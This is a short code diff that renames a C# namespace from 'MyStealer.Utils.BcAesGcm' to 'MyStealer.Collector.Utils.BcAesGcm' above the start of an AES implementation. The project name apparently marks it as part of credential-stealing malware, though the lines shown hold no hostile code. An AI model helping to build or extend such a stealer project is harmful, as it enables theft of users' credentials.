@@ -1,6 +1,6 @@
 using System;
 
-namespace MyStealer.Utils.BcAesGcm
+namespace MyStealer.Collector.Utils.BcAesGcm
 {
     /**
     * an implementation of the AES (Rijndael), from FIPS-197.
